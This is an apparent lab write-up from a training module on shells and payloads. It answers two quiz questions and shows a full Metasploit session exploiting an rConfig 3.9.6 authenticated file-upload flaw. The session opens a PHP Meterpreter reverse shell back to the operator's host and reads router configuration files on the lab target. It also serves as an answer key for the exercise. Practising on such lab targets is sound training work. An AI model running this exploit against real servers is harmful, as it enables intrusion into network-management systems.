# Section 10: Infiltrating Unix/Linux

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?

Context: [Code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb)

**Answer:** `PHP`

---

### 2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.

Context: 
```bash
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set LHOST 10.10.15.239
LHOST => 10.10.15.239
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set RHOSTS 10.129.145.236
RHOSTS => 10.129.145.236
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> show options

Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password of the admin account
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, htt
                                         p, sapni
   RHOSTS     10.129.145.236   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of the rConfig server
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Username of the admin account
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
                                       sten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.239     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   rConfig <= 3.9.6



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> exploit
[*] Started reverse TCP handler on 10.10.15.239:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'gysbxlf.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (42137 bytes) to 10.129.145.236
[+] Deleted gysbxlf.php
[*] Meterpreter session 1 opened (10.10.15.239:4444 -> 10.129.145.236:40798) at 2026-07-29 04:59:15 -0400

(Meterpreter 1)(/home/rconfig/www/images/vendor) > shell
Process 2438 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
hostname
localhost.localdomain
ls /devicedetails
edgerouter-isp.yml
hostnameinfo.txt
cat /devicedetails/hostnaminfo.txt
cat: /devicedetails/hostnaminfo.txt: No such file or directory
cat /devicedetails/hostnameinfo.txt
Note: 

All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it. 
cat edgerouter-isp.yml
cat: edgerouter-isp.yml: No such file or directory
cat /devicedetails/edgerouter-isp.yml
me: configure top level configuration
  cisco.ios.ios_config:
    lines: hostname edgerouter-isp

- name: configure interface settings
  cisco.ios.ios_config:
    lines:
    - description test interface
    - ip address 192.168.0.10 255.255.255.0
    parents: interface gigabitethernet0/0

- name: configure ip helpers on multiple interfaces
  cisco.ios.ios_config:
    lines:
    - ip helper-address 10.10.10.15
    - ip helper-address 10.10.11.12
    parents: '{{ item }}'
  with_items:
  - interface Ethernet1
  - interface Ethernet2
  - interface GigabitEthernet1
```

**Answer:** `edgerouter-isp`

---

[Back to Module Index](./README.md)
